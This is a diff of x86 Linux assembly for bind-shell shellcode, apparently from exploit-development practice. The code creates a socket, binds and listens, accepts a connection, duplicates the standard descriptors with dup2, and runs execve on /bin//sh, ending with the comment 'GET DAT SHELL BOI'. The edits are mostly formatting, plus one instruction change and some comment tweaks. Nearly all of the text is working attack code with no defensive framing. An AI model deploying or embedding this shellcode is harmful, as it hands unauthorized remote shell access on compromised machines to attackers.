@@ -15,7 +15,6 @@ _start:
 	;socket(AF_INET, SOCK_STREAM, 0)
 	;ebx     ecx       ebx        esi
 
-
 	;
 	; create a socket
 	; socket(2, 1, 0)
@@ -30,12 +29,12 @@ _start:
 
 	mov bl, 0x1	; socket() = 1
 
-	push esi	; IPPROTO = 0
-	push ebx	; SOCK_STREAM = 1 -- 0x1 from before
-	push byte 0x2	; AF_INET = 2
+	push esi		; IPPROTO = 0
+	push ebx		; SOCK_STREAM = 1 -- 0x1 from before
+	push byte 0x2		; AF_INET = 2
 
-	mov ecx, esp	; save pointer in ecx -- points to socket() args
-	int 0x80	; run socket()
+	mov ecx, esp		; save pointer in ecx -- points to socket() args
+	int 0x80		; run socket()
 
 	; need to store sockfd somewhere as eax will be overwritten
 	; store sockfd into esi
@@ -65,7 +64,6 @@ _start:
 
 	mov ecx, esp		; save pointer in ecx -- points to bind() args
 
-	;xor eax, eax		; clear eax -- sloppy and wastes a byte
 	mov al, 0x66		; socketcall() syscall # 
 
 	int 0x80		; run bind()
@@ -75,17 +73,18 @@ _start:
 	; listen(sockfd, 2)
 	;
 
-	push ebx	; queueLimit = 2 -- 0x2 from before
-	push esi	; sockfd / 0x3
+	push ebx		; queueLimit = 2 -- 0x2 from before
+	push esi		; sockfd / 0x3
 
-	mov ecx, esp	; save pointer in ecx -- points to listen() args
+	mov ecx, esp		; save pointer in ecx -- points to listen() args
 
-	inc ebx		; add 2 to ebx to equal 0x4 for listen() syscall #
-	inc ebx		; ebx = 0x4
+	inc ebx			; add 2 to ebx to equal 0x4 for listen() syscall #
+	inc ebx			; ebx = 0x4
+	
+	push 0x66		; changed this from mov al, 0x66 and it works
+	pop eax			; socketcall() syscall #
 
-	mov al, 0x66	; socketcall() syscall #
-
-	int 0x80	; run listen()
+	int 0x80		; run listen()
 
 	;
 	; accept incoming connections
@@ -118,7 +117,6 @@ _start:
 
 	mov cl, 0x2	; store 0x2 into ecx for counter
 
-
 duploop:
 	mov al, 0x3f	; dup2() syscall #
 	int 0x80	; run dup2
@@ -132,10 +130,10 @@ duploop:
 	mov al, 0x0b		; execve() syscall #
 
 	push edx		; NULL 
-	push 0x68732f2f     	; hs//  
+	push 0x68732f2f     	; hs//  - two slashes are added to make the total value 8 bytes
 	push 0x6e69622f     	; nib/  
       
 	mov ebx, esp       	; EBX points to "/bin//sh"  
 	mov ecx, edx        	; ECX = NULL    
 	
-  int 0x80		; run execve() GET DAT SHELL BOI
+    	int 0x80		; run execve() GET DAT SHELL BOI
